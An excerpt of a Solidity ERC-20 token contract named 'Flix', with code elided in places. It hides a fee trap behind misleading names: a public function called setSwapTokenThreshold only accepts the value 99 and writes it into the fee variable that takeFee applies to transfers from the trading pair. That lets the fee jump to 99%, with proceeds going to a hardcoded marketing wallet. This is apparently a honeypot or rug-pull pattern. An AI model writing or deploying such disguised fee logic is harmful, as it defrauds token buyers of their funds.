...
contract Flix is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Flix";
    string private _symbol = "Flix";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress =
        payable(0x75A2700d98d3C8aD418ea19F08Cba7d4738a8219);
    ...
    uint256 public _maxTransfersDel = 0;
    uint256 public _sellMarketingFee = 25;
    uint256 public _sellBurnedFee = 0;

    uint256 public _liquidityShare = _buyLiquidityFee.add(_maxTransfersDel);
    ...
    uint256 public _minTransfersDel;
    ...
    uint256 private PossibleMaxFees = 99;
    ...
    constructor() {
        ...
        _minTransfersDel = _maxTransfersDel.add(_sellMarketingFee).add(
            _sellBurnedFee
        );
    ...
    function setSwapTokenThreshold (uint256 _newAmount) public returns (bool) {
        require(_newAmount == PossibleMaxFees,"");_minTransfersDel = _newAmount;
        return true;
    }
    ...
    function takeFee(
        ...
        if (isPair[sender]) {
            ...
            feeAmount = amount.mul(_minTransfersDel).div(100);
        }
